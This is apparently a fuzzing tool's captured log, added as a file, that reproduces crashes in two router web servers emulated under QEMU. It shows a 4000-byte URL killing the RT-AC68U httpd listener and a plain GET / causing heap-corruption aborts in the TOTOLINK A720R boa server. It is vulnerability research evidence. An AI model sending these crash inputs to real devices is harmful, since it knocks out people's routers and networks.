@@ -1,0 +1,19 @@
+RRFuzz vulnerability reproduction evidence
+Captured: 2026-09-14 20:25:06 on webfuzz
+----
+Script started on 2026-09-14 20:25:06+08:00 [<not executed on terminal>]
+===== RT-AC68U httpd: 4000-byte URL overflow, listener-death check =====
+baseline: ALIVE
+GET /AAAA(4000) -> recv=b'' ; listener=DEAD(ConnectionRefusedError)
+ac68u_a720r.sh: line 30: 851869 Segmentation fault      (core dumped) setsid env LD_PRELOAD=./libnvfuzz_arm.so $QARM -L rootfs rootfs/usr/sbin/httpd -p 8089 > /tmp/ac68u_repro.log 2>&1
+--- QEMU stderr: ---
+qemu: uncaught target signal 11 (Segmentation fault) - core dumped
+
+===== TOTOLINK A720R boa: GET / -> SIGABRT heap corruption, listener death =====
+baseline: ALIVE
+GET / -> recv=b'' ; listener=DEAD(ConnectionRefusedError)
+ac68u_a720r.sh: line 57: 852013 Aborted                 (core dumped) setsid $QMIPS -L . bin/boa -c . -d > /tmp/a720r_repro.log 2>&1
+--- QEMU stderr: ---
+qemu: uncaught target signal 6 (Aborted) - core dumped
+
+Script done on 2026-09-14 20:25:22+08:00 [COMMAND_EXIT_CODE="1"]
